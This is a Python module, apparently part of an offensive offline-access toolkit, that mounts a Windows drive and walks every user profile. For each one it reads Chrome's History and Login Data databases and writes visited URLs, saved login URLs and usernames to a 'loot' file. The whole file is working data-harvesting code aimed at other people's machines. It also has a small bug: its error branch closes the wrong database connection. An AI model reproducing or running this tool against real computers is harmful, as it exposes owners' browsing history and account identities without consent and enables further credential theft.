import subprocess
import shutil
import os
import time
import sqlite3
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing loot file at 'tofu_loot/chrome_history.txt'")
		try:
			open("tofu_loot/chrome_history.txt","x").close()
		except FileExistsError:
			pass
		
		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			users = os.listdir("tofu_tmp/windows_filesystem/Users/")
			history_file = open("tofu_loot/chrome_history.txt","a")
			for user in users:
				print(f"[+++] ------- - -// USER DISCOVERED : {user}")
				history_file.write(f"\n=============================\n===== > {user} : \n")
				try:
					path = f"tofu_tmp/windows_filesystem/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History"
					path2 = f"tofu_tmp/windows_filesystem/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
					conn = sqlite3.connect(path)
					try:
						cursor = conn.cursor()
						cursor.execute("SELECT url FROM urls")
						for url in cursor.fetchall():
							history_file.write(f"{url[0]}\n")
							print(f"[###] URL : {url[0]}")
							
						conn.close()
					except Exception as sqlite_error:
						print(f"[-] Unknown error : {sqlite_error}")
						conn.close()
					print("[+========== LOGIN DATA ==========+]")
					conn2 = sqlite3.connect(path2)
					try:
						cursor2 = conn2.cursor()
						cursor2.execute("SELECT action_url,username_value FROM logins")
						allData = cursor2.fetchall()
						for data in allData:

							if len(data[0]) > 0 or len(data[1]) > 0:
								history_file.write(f"URL : {data[0]}\n")
								history_file.write(f"Username : {data[1]}\n")
								print(f"[!!!] URL : {data[0]}")
								print(f"[!!!] Username : {repr(data[1])}")
							
						conn2.close()
					except Exception as sqlite_error:
						print(f"[-] Unknown error : {sqlite_error}")
						conn.close()
				except sqlite3.OperationalError as sqlite3_error:
					print(f"[---] {sqlite3_error}")
				
					
					
		except Exception as open_error:
			print(f"[-] Error {open_error}")
		time.sleep(2)	
		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
